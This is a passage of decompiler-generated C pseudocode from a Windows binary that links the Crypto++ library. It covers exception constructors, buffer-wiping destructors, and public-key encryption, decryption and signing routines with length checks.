  result = sub_13F169C90(*v6, a1, a2, a3, 0i64, (__int64)va);
  if ( (int)result < 0 )
    return 0xFFFFFFFFi64;
  return result;
}

//----- (000000013F10D440) ----------------------------------------------------
_QWORD *__fastcall sub_13F10D440(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = &CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable';
  return a1;
}
// 13F182758: using guessed type void *CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable';

//----- (000000013F10D470) ----------------------------------------------------
_QWORD *__fastcall sub_13F10D470(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = off_13F182770;
  return a1;
}
// 13F182770: using guessed type __int64 (__fastcall *off_13F182770[2])();

//----- (000000013F10D4A0) ----------------------------------------------------
__int64 __fastcall sub_13F10D4A0(__int64 a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  __m128i v5; // [rsp+30h] [rbp-38h] BYREF
  __m128i si128; // [rsp+40h] [rbp-28h]

  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v5.m128i_i8[0] = 0;
  sub_13F106C30(&v5, (const __m128i *)"PK_Signer: key too short for this signature scheme");
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 6;
  sub_13F1053F0((__m128i **)(a1 + 32), &v5);
  *(_QWORD *)a1 = &CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable';
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v2 = si128.m128i_i64[1] + 1;
    v3 = v5.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v2 = si128.m128i_i64[1] + 40;
      v3 = *(_QWORD *)(v5.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v5.m128i_i64[0] - v3 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v3, v2);
  }
  *(_QWORD *)a1 = off_13F182770;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F182758: using guessed type void *CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable';
// 13F182770: using guessed type __int64 (__fastcall *off_13F182770[2])();
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F10D580) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10D580(_QWORD *a1)
{
  __int64 v1; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v3; // r8
  void *v4; // rdx

  *a1 = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v1 = 3i64;
  result = a1[3];
  if ( a1[2] < result )
    v1 = 2i64;
  v3 = a1[v1];
  v4 = (void *)a1[4];
  if ( v4 )
  {
    memset(v4, 0, v3);
    return sub_13F12E550(v4);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F1827C0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';

//----- (000000013F10D5E0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10D5E0(_QWORD *a1)
{
  unsigned __int64 v2; // rdx
  __int64 v3; // rcx
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rdx
  __int64 v6; // rcx
  unsigned __int64 v7; // rdx
  __int64 v8; // rcx
  unsigned __int64 result; // rax
  void *v10; // rdx
  __int64 (__fastcall ***v11)(_QWORD, __int64); // rcx

  *a1 = off_13F1827D0;
  a1[1] = off_13F182958;
  a1[6] = off_13F182978;
  v2 = a1[21];
  if ( v2 >= 0x10 )
  {
    v3 = a1[18];
    v4 = v2 + 1;
    if ( v4 >= 0x1000 )
    {
      v4 += 39i64;
      if ( (unsigned __int64)(v3 - *(_QWORD *)(v3 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v3 = *(_QWORD *)(v3 - 8);
    }
    sub_13F14088C(v3, v4);
  }
  a1[20] = 0i64;
  a1[21] = 15i64;
  *((_BYTE *)a1 + 144) = 0;
  v5 = a1[17];
  if ( v5 >= 0x10 )
  {
    v6 = a1[14];
    v7 = v5 + 1;
    if ( v7 >= 0x1000 )
    {
      v7 += 39i64;
      if ( (unsigned __int64)(v6 - *(_QWORD *)(v6 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v6 = *(_QWORD *)(v6 - 8);
    }
    sub_13F14088C(v6, v7);
  }
  a1[16] = 0i64;
  a1[17] = 15i64;
  *((_BYTE *)a1 + 112) = 0;
  a1[6] = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v8 = 3i64;
  result = a1[9];
  if ( a1[8] < result )
    v8 = 2i64;
  v10 = (void *)a1[10];
  if ( v10 )
  {
    memset(v10, 0, a1[v8 + 6]);
    result = sub_13F12E550(v10);
  }
  v11 = (__int64 (__fastcall ***)(_QWORD, __int64))a1[3];
  if ( v11 )
    return (**v11)(v11, 1i64);
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1827C0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 13F1827D0: using guessed type __int64 (__fastcall *off_13F1827D0[49])();
// 13F182958: using guessed type void *off_13F182958[4];
// 13F182978: using guessed type void *off_13F182978[2];

//----- (000000013F10D760) ----------------------------------------------------
_QWORD *__fastcall sub_13F10D760(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  void *v5; // rdx

  *a1 = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v4 = 3i64;
  if ( a1[2] < a1[3] )
    v4 = 2i64;
  v5 = (void *)a1[4];
  if ( v5 )
  {
    memset(v5, 0, a1[v4]);
    sub_13F12E550(v5);
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 40i64);
  return a1;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1827C0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';

//----- (000000013F10D7F0) ----------------------------------------------------
_QWORD *__fastcall sub_13F10D7F0(_QWORD *a1, char a2)
{
  sub_13F10D5E0(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 176i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10D830) ----------------------------------------------------
__int64 __fastcall sub_13F10D830(__int64 a1, __int64 a2)
{
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 88) + 16i64))(*(_QWORD *)(a1 + 88));
  return a2;
}

//----- (000000013F10D850) ----------------------------------------------------
__int64 __fastcall sub_13F10D850(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 88) + 40i64))(*(_QWORD *)(a1 + 88));
}

//----- (000000013F10D860) ----------------------------------------------------
__int64 __fastcall sub_13F10D860(
        _QWORD *a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        unsigned __int64 a5,
        __int64 a6,
        __int64 a7)
{
  __int64 v9; // rax
  unsigned __int64 v10; // rsi
  void *v11; // r14
  __int64 v12; // rbx
  _QWORD *v13; // rax
  unsigned __int64 v14; // rcx
  __int64 v15; // rdx
  __int64 (__fastcall *(**v16)[4])(); // rax
  __int64 *v17; // rdi
  __int64 v18; // rbx
  __int64 v19; // rax
  unsigned __int64 v20; // rcx
  __int64 v21; // rdx
  unsigned __int64 v23; // rax
  __m128i *v24; // rsi
  __m128i *v25; // rbx
  __m128i *v26; // rax
  __m128i *v27; // rax
  __m128i *v28; // rax
  __m128i *v29; // rax
  __m128i *v30; // rax
  __m128i *v31; // rax
  char v34[16]; // [rsp+58h] [rbp-A8h] BYREF
  unsigned __int64 v35; // [rsp+68h] [rbp-98h]
  unsigned __int64 v36; // [rsp+70h] [rbp-90h]
  void *v37; // [rsp+78h] [rbp-88h]
  __int64 v38; // [rsp+88h] [rbp-78h]
  __m128i v39; // [rsp+90h] [rbp-70h] BYREF
  unsigned __int64 v40; // [rsp+A0h] [rbp-60h]
  void *v41; // [rsp+A8h] [rbp-58h]
  __m128i v42; // [rsp+B0h] [rbp-50h] BYREF
  unsigned __int64 v43; // [rsp+C0h] [rbp-40h]
  unsigned __int64 v44; // [rsp+C8h] [rbp-38h]
  void *v45; // [rsp+D0h] [rbp-30h]
  __m128i v46[2]; // [rsp+E0h] [rbp-20h] BYREF
  char v47[32]; // [rsp+100h] [rbp+0h] BYREF
  __m128i v48[2]; // [rsp+120h] [rbp+20h] BYREF
  __m128i v49[2]; // [rsp+140h] [rbp+40h] BYREF
  __m128i v50[2]; // [rsp+160h] [rbp+60h] BYREF
  __m128i v51[2]; // [rsp+180h] [rbp+80h] BYREF
  char pExceptionObject[64]; // [rsp+1A0h] [rbp+A0h] BYREF

  v38 = -2i64;
  if ( a5 != (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 32i64))(a1) )
  {
    v23 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 32i64))(a1);
    v24 = sub_13F1124A0(&v39, v23, 0xAui64);
    v25 = sub_13F1124A0(v46, a5, 0xAui64);
    v26 = (__m128i *)(*(__int64 (__fastcall **)(_QWORD *, char *))(a1[1] + 16i64))(a1 + 1, v47);
    v27 = sub_13F107420(v48, v26, (const __m128i *)": ciphertext length of ");
    v28 = sub_13F107480(v49, v27, v25);
    v29 = sub_13F107420(v50, v28, (const __m128i *)" doesn't match the required length of ");
    v30 = sub_13F107480(v51, v29, v24);
    v31 = sub_13F107420(&v42, v30, (const __m128i *)" for this key");
    sub_13F101600((__int64)pExceptionObject, v31);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v9 = sub_13F1068C0(a1);
  v10 = (unsigned __int64)(v9 + 7) >> 3;
  v39.m128i_i64[1] = -1i64;
  v40 = v10;
  if ( v10 )
    v11 = (void *)sub_13F12E4E0((unsigned __int64)(v9 + 7) >> 3);
  else
    v11 = 0i64;
  v41 = v11;
  v12 = (*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 16i64))(a1 + 2);
  v13 = sub_13F112B70(&v42, a4, a5, 0, 1);
  (*(void (__fastcall **)(__int64, char *, __int64, _QWORD *))(*(_QWORD *)v12 + 24i64))(v12, v34, a3, v13);
  v14 = v44;
  if ( v43 < v44 )
    v14 = v43;
  v15 = (__int64)v45;
  if ( v45 )
  {
    memset(v45, 0, 8 * v14);
    sub_13F12E4D0(v15);
  }
  if ( (unsigned int)sub_13F11C050((__int64)v34) > v10 )
  {
    v16 = sub_13F11EB60();
    sub_13F113500((__int64)v34, (__int64)v16);
  }
  sub_13F11D700((__int64)v34, (__int64)v11, v10, 0);
  v17 = (__int64 *)(*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 24i64))(a1 + 2);
  v18 = *v17;
  v19 = sub_13F1068C0(a1);
  (*(void (__fastcall **)(__int64 *, __int64, void *, __int64, __int64, __int64))(v18 + 32))(v17, a2, v11, v19, a6, a7);
  v20 = v36;
  if ( v35 < v36 )
    v20 = v35;
  v21 = (__int64)v37;
  if ( v37 )
  {
    memset(v37, 0, 8 * v20);
    sub_13F12E4D0(v21);
  }
  if ( v11 )
  {
    memset(v11, 0, v10);
    sub_13F12E550(v11);
  }
  return a2;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F10D860: using guessed type __m128i var_150[2];
// 13F10D860: using guessed type char var_130[32];
// 13F10D860: using guessed type __m128i var_110[2];
// 13F10D860: using guessed type __m128i var_F0[2];
// 13F10D860: using guessed type __m128i var_D0[2];
// 13F10D860: using guessed type __m128i var_B0[2];

//----- (000000013F10DB20) ----------------------------------------------------
__int64 __fastcall sub_13F10DB20(_QWORD *a1, __int64 a2, __int64 a3, unsigned __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v8; // rax
  __int64 v9; // r15
  void *v10; // r12
  __int64 *v11; // rdi
  __int64 v12; // rbx
  __int64 v13; // rax
  __int64 v14; // rbx
  _QWORD *v15; // rax
  __int64 v16; // rbx
  unsigned __int64 v17; // rax
  unsigned __int64 *v18; // rcx
  __int64 result; // rax
  __int64 v20; // rdx
  unsigned __int64 v21; // rcx
  __int64 v22; // rdx
  unsigned __int64 v23; // rax
  __m128i *v24; // rsi
  __m128i *v25; // rbx
  __m128i *v26; // rax
  __m128i *v27; // rax
  __m128i *v28; // rax
  __m128i *v29; // rax
  __m128i *v30; // rax
  __m128i *v31; // rax
  __m128i *v32; // rax
  __m128i *v33; // rax
  __m128i v36; // [rsp+68h] [rbp-98h] BYREF
  __int64 v37; // [rsp+78h] [rbp-88h]
  void *v38; // [rsp+80h] [rbp-80h]
  __m128i v39; // [rsp+90h] [rbp-70h] BYREF
  unsigned __int64 v40; // [rsp+A0h] [rbp-60h] BYREF
  unsigned __int64 v41; // [rsp+A8h] [rbp-58h] BYREF
  void *v42; // [rsp+B0h] [rbp-50h]
  __m128i v43; // [rsp+D0h] [rbp-30h] BYREF
  unsigned __int64 v44; // [rsp+E0h] [rbp-20h]
  unsigned __int64 v45; // [rsp+E8h] [rbp-18h]
  void *v46; // [rsp+F0h] [rbp-10h]
  __m128i v47[2]; // [rsp+100h] [rbp+0h] BYREF
  char v48[32]; // [rsp+120h] [rbp+20h] BYREF
  __m128i v49[2]; // [rsp+140h] [rbp+40h] BYREF
  __m128i v50[2]; // [rsp+160h] [rbp+60h] BYREF
  __m128i v51[2]; // [rsp+180h] [rbp+80h] BYREF
  char pExceptionObject[64]; // [rsp+1A0h] [rbp+A0h] BYREF

  if ( a4 > (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 40i64))(a1) )
  {
    if ( (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 40i64))(a1) )
    {
      v23 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 40i64))(a1);
      v24 = sub_13F1124A0(v47, v23, 0xAui64);
      v25 = sub_13F1124A0(&v36, a4, 0xAui64);
      v26 = (__m128i *)(*(__int64 (__fastcall **)(_QWORD *, char *))(a1[1] + 16i64))(a1 + 1, v48);
      v27 = sub_13F107420(v49, v26, (const __m128i *)": message length of ");
      v28 = sub_13F107480(v50, v27, v25);
      v29 = sub_13F107420(v51, v28, (const __m128i *)" exceeds the maximum of ");
      v30 = sub_13F107480(&v43, v29, v24);
      v31 = sub_13F107420(&v39, v30, (const __m128i *)" for this public key");
      sub_13F101600((__int64)pExceptionObject, v31);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v32 = (__m128i *)(*(__int64 (__fastcall **)(_QWORD *, __m128i *))(a1[1] + 16i64))(a1 + 1, &v36);
    v33 = sub_13F107420(v47, v32, (const __m128i *)": this key is too short to encrypt any messages");
    sub_13F101600((__int64)&v39, v33);
    CxxThrowException(&v39, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v8 = sub_13F1068C0(a1);
  v9 = (unsigned __int64)(v8 + 7) >> 3;
  v36.m128i_i64[1] = -1i64;
  v37 = v9;
  if ( v9 )
    v10 = (void *)sub_13F12E4E0((unsigned __int64)(v8 + 7) >> 3);
  else
    v10 = 0i64;
  v38 = v10;
  v11 = (__int64 *)(*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 24i64))(a1 + 2);
  v12 = *v11;
  v13 = sub_13F1068C0(a1);
  (*(void (__fastcall **)(__int64 *, __int64, __int64, unsigned __int64, void *, __int64, __int64))(v12 + 24))(
    v11,
    a2,
    a3,
    a4,
    v10,
    v13,
    a6);
  v14 = (*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 16i64))(a1 + 2);
  v15 = sub_13F112B70(&v43, (__int64)v10, v9, 0, 1);
  v16 = (*(__int64 (__fastcall **)(__int64, __m128i *, __int64, _QWORD *))(*(_QWORD *)v14 + 40i64))(v14, &v39, a2, v15);
  v17 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 32i64))(a1);
  sub_13F11D700(v16, a5, v17, 0);
  v18 = &v40;
  result = v41;
  if ( v40 >= v41 )
    v18 = &v41;
  v20 = (__int64)v42;
  if ( v42 )
  {
    memset(v42, 0, 8 * *v18);
    result = sub_13F12E4D0(v20);
  }
  v21 = v45;
  if ( v44 < v45 )
    v21 = v44;
  v22 = (__int64)v46;
  if ( v46 )
  {
    memset(v46, 0, 8 * v21);
    result = sub_13F12E4D0(v22);
  }
  if ( v10 )
  {
    memset(v10, 0, v9);
    return sub_13F12E550(v10);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F10DB20: using guessed type __m128i var_130[2];
// 13F10DB20: using guessed type char var_110[32];
// 13F10DB20: using guessed type __m128i var_F0[2];
// 13F10DB20: using guessed type __m128i var_D0[2];
// 13F10DB20: using guessed type __m128i var_B0[2];

//----- (000000013F10DE10) ----------------------------------------------------
__int64 __fastcall sub_13F10DE10(_QWORD *a1, _QWORD *a2, const __m128i *a3, unsigned __int64 a4)
{
  __int64 *v8; // r15
  __int64 v9; // rax
  __int64 v10; // rbx
  unsigned int v11; // eax
  unsigned __int64 v12; // rbx
  __int64 v13; // rax
  __int64 v14; // rsi
  unsigned int v15; // edi
  unsigned int v16; // ebx
  __int64 v17; // rax
  unsigned __int64 v18; // rax
  __int64 v19; // rdi
  __int64 v20; // rax
  char v22[8]; // [rsp+48h] [rbp-F0h] BYREF
  unsigned int v23; // [rsp+50h] [rbp-E8h]
  __m128i v24[4]; // [rsp+60h] [rbp-D8h] BYREF
  char pExceptionObject[64]; // [rsp+A0h] [rbp-98h] BYREF

  (*(void (__fastcall **)(_QWORD *, char *))(*a1 + 120i64))(a1, v22);
  v8 = (__int64 *)(*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 24i64))(a1 + 2);
  v9 = (*(__int64 (__fastcall **)(_QWORD *))(*a2 + 152i64))(a2);
  v10 = *v8;
  v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v9 + 64i64))(v9);
  v12 = (*(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD))(v10 + 8))(v8, v23, v11);
  if ( sub_13F10E1C0((__int64)a1) < v12 )
  {
    sub_13F10D4A0((__int64)v24);
    CxxThrowException(v24, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v13 = (*(__int64 (__fastcall **)(_QWORD *))(*a2 + 152i64))(a2);
  v14 = *v8;
  v15 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v13 + 64i64))(v13);
  v16 = *(_DWORD *)((*(__int64 (__fastcall **)(_QWORD *, __m128i *))(*a1 + 120i64))(a1, v24) + 8);
  v17 = sub_13F10E1C0((__int64)a1);
  v18 = (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD, _QWORD))(v14 + 16))(v8, v17, v16, v15);
  if ( !v18 )
  {
    sub_13F1053B0(
      v24,
      (const __m128i *)"TF_SignerBase: this algorithm does not support message recovery or the key is too short");
    sub_13F101660((__int64)pExceptionObject, v24);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
  }
  if ( a4 > v18 )
  {
    sub_13F1053B0(
      v24,
      (const __m128i *)"TF_SignerBase: the recoverable message part is too long for the given key and algorithm");
    sub_13F101600((__int64)pExceptionObject, v24);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_13F105240(a2 + 1, a3, a4);
  v19 = *v8;
  v20 = (*(__int64 (__fastcall **)(_QWORD *))(*a2 + 152i64))(a2);
  return (*(__int64 (__fastcall **)(__int64 *, __int64, const __m128i *, unsigned __int64, _QWORD, _QWORD, _QWORD *))(v19 + 40))(
           v8,
           v20,
           a3,
           a4,
           0i64,
           0i64,
           a2 + 13);
}
// 13F10DE10: using guessed type char var_F0[8];
// 13F10DE10: using guessed type __m128i var_D8[4];

//----- (000000013F10DFF0) ----------------------------------------------------
void **__fastcall sub_13F10DFF0(_QWORD *a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  __int64 *v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rdi
  unsigned int v11; // eax
  unsigned __int64 v12; // rdi
  __int64 v13; // rax
  __int64 v14; // rbx
  _QWORD *v15; // rax
  unsigned __int64 v16; // rcx
  __int64 v17; // rdx
  unsigned __int64 v18; // rdi
  __int64 (__fastcall *(**v19)[4])(); // rax
  void **result; // rax
  unsigned __int64 v21; // rcx
  __int64 v22; // rdx
  char v23[16]; // [rsp+30h] [rbp-D8h] BYREF
  unsigned __int64 v24; // [rsp+40h] [rbp-C8h]
  unsigned __int64 v25; // [rsp+48h] [rbp-C0h]
  void *v26; // [rsp+50h] [rbp-B8h]
  __int64 v27; // [rsp+60h] [rbp-A8h]
  char v28[8]; // [rsp+68h] [rbp-A0h] BYREF
  unsigned int v29; // [rsp+70h] [rbp-98h]
  __int64 pExceptionObject[2]; // [rsp+80h] [rbp-88h] BYREF
  unsigned __int64 v31; // [rsp+90h] [rbp-78h]
  unsigned __int64 v32; // [rsp+98h] [rbp-70h]
  void *v33; // [rsp+A0h] [rbp-68h]

  v27 = -2i64;
  (*(void (__fastcall **)(_QWORD *, char *))(*a1 + 136i64))(a1, v28);
  v8 = (__int64 *)(*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 24i64))(a1 + 2);
  v9 = (*(__int64 (__fastcall **)(_QWORD *))(*a2 + 152i64))(a2);
  v10 = *v8;
  v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v9 + 64i64))(v9);
  v12 = (*(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD))(v10 + 8))(v8, v29, v11);
  if ( sub_13F10E1C0((__int64)a1) < v12 )
  {
    sub_13F10D4A0((__int64)pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v13 = sub_13F10E1C0((__int64)a1);
  sub_13F1051C0(a2 + 5, (unsigned __int64)(v13 + 7) >> 3);
  v14 = (*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 16i64))(a1 + 2);
  v15 = sub_13F112B70(pExceptionObject, a3, a4, 0, 1);
  (*(void (__fastcall **)(__int64, char *, _QWORD *))(*(_QWORD *)v14 + 56i64))(v14, v23, v15);
  v16 = v32;
  if ( v31 < v32 )
    v16 = v31;
  v17 = (__int64)v33;
  if ( v33 )
  {
    memset(v33, 0, 8 * v16);
    sub_13F12E4D0(v17);
  }
  v18 = (unsigned int)sub_13F11BFE0((__int64)v23);
  if ( v18 > sub_13F10E1C0((__int64)a1) )
  {
    v19 = sub_13F11EB60();
    sub_13F113500((__int64)v23, (__int64)v19);
  }
  result = sub_13F11D700((__int64)v23, a2[8], a2[7], 0);
  v21 = v25;
  if ( v24 < v25 )
    v21 = v24;
  v22 = (__int64)v26;
  if ( v26 )
  {
    memset(v26, 0, 8 * v21);
    return (void **)sub_13F12E4D0(v22);
  }
  return result;
}
// 13F10DFF0: using guessed type char var_A0[8];
// 13F10DFF0: using guessed type _QWORD pExceptionObject[2];

//----- (000000013F10E1C0) ----------------------------------------------------
__int64 __fastcall sub_13F10E1C0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  unsigned int v3; // eax
  unsigned int v4; // eax
  __int64 v5; // rbx
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  char v9[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v10; // [rsp+38h] [rbp-30h]
  unsigned __int64 v11; // [rsp+40h] [rbp-28h]
  void *v12; // [rsp+48h] [rbp-20h]

  v1 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 8i64))(a1 + 16);
  v2 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v1 + 16i64))(v1, v9);
  v3 = sub_13F11BFE0(v2);
  if ( v3 <= 1 )
    v4 = 0;
  else
    v4 = v3 - 1;
  v5 = v4;
  v6 = v11;
  if ( v10 < v11 )
    v6 = v10;
  v7 = (__int64)v12;
  if ( v12 )
  {
    memset(v12, 0, 8 * v6);
    sub_13F12E4D0(v7);
  }
  return v5;
}
// 13F10E1C0: using guessed type char var_40[16];

//----- (000000013F10E240) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10E240(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        char a8,
        unsigned int a9)
{
  _QWORD *v13; // rax
  _QWORD *v14; // rbx
  __int64 v16; // rax
  int v18; // [rsp+20h] [rbp-128h]
  int v19; // [rsp+20h] [rbp-128h]
  int v20; // [rsp+20h] [rbp-128h]
  __int64 v21[22]; // [rsp+50h] [rbp-F8h] BYREF

  v13 = (_QWORD *)sub_13F14059C(48i64);
  if ( a8 )
  {
    v14 = v13;
    if ( v13 )
    {
      sub_13F10EE30((__int64)v13, 0);
      v14[3] = a2;
      v14[4] = a3;
      v14[5] = 0i64;
      *v14 = off_13F182B18;
      v14[1] = off_13F182C88;
    }
    else
    {
      v14 = 0i64;
    }
  }
  else if ( v13 )
  {
    v14 = sub_13F1031E0(v13, a2, a3);
  }
  else
  {
    v14 = 0i64;
  }
  sub_13F128ED0(
    (__int64)v21,
    a1,
    (__int64)v14,
    0,
    -1,
    (const __m128i *)&qword_13F1B7008,
    (const __m128i *)&qword_13F1B7008);
  while ( 1 )
  {
    v16 = v14[4] - v14[5];
    if ( v14[4] <= v14[5] )
      v16 = 0i64;
    if ( !v16 )
      break;
    LOBYTE(v18) = 1;
    (*(void (__fastcall **)(__int64 *, __int64, __int64, _QWORD, int))(v21[0] + 48))(v21, a4, a5, 0i64, v18);
    sub_13F110D80(v21, a9++, 1, 1);
    LOBYTE(v19) = 1;
    (*(void (__fastcall **)(__int64 *, __int64, __int64, _QWORD, int))(v21[0] + 48))(v21, a6, a7, 0i64, v19);
    LOBYTE(v20) = 1;
    (*(void (__fastcall **)(__int64 *, _QWORD, _QWORD, __int64, int))(v21[0] + 48))(v21, 0i64, 0i64, 0xFFFFFFFFi64, v20);
  }
  return sub_13F10D5E0(v21);
}
// 13F10E370: variable 'v18' is possibly undefined
// 13F10E3A2: variable 'v19' is possibly undefined
// 13F10E3BF: variable 'v20' is possibly undefined
// 13F182B18: using guessed type __int64 (__fastcall *off_13F182B18[46])();
// 13F182C88: using guessed type void *off_13F182C88[3];
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F10E400) ----------------------------------------------------
__int64 __fastcall sub_13F10E400(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 *v8; // r15
  __int64 v9; // rax
  __int64 v10; // rbx
  unsigned int v11; // eax
  unsigned __int64 v12; // rbx
  __int64 v13; // rsi
  __int64 v14; // rdi
  __int64 v15; // rbx
  __int64 v16; // rax
  __int64 result; // rax
  char v18; // [rsp+20h] [rbp-D8h]
  __int128 v19; // [rsp+40h] [rbp-B8h] BYREF
  __int128 v20; // [rsp+50h] [rbp-A8h] BYREF
  char pExceptionObject[64]; // [rsp+60h] [rbp-98h] BYREF

  (*(void (__fastcall **)(_QWORD *, __int128 *))(*a1 + 136i64))(a1, &v19);
  v8 = (__int64 *)(*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 24i64))(a1 + 2);
  v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a4 + 152i64))(a4);
  v10 = *v8;
  v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v9 + 64i64))(v9);
  v12 = (*(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD))(v10 + 8))(v8, DWORD2(v19), v11);
  if ( sub_13F10E1C0((__int64)a1) < v12 )
  {
    sub_13F10D4A0((__int64)pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v13 = *v8;
  v14 = *(_QWORD *)(a4 + 64);
  v20 = v19;
  v15 = sub_13F10E1C0((__int64)a1);
  v16 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a4 + 152i64))(a4);
  v18 = *(_BYTE *)(a4 + 232);
  (*(void (__fastcall **)(__int64 *, __int64, __int64, __int128 *, char, __int64, __int64, __int64))(v13 + 64))(
    v8,
    a2,
    v16,
    &v20,
    v18,
    v14,
    v15,
    a3);
  result = a2;
  *(_BYTE *)(a4 + 232) = 1;
  return result;
}

//----- (000000013F10E550) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10E550(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD *v6; // rbp
  __int64 v7; // rax
  __int64 v8; // rdi
  unsigned int v9; // eax
  unsigned __int64 v10; // rdi
  __int64 v11; // rax
  __int64 v12; // r14
  void *v13; // r15
  __int64 v14; // rbx
  __int64 v15; // rsi
  __int64 v16; // rbp
  __int64 v17; // rdi
  __int64 v18; // rax
  unsigned __int64 v19; // rbx
  __int64 v20; // rax
  __int64 v21; // rax
  unsigned __int64 *v22; // rcx
  __int64 v23; // rdx
  unsigned __int64 v24; // rcx
  __int64 v25; // rdx
  _QWORD *v28; // [rsp+58h] [rbp-130h]
  __int128 v30; // [rsp+70h] [rbp-118h] BYREF
  __int64 v31; // [rsp+80h] [rbp-108h]
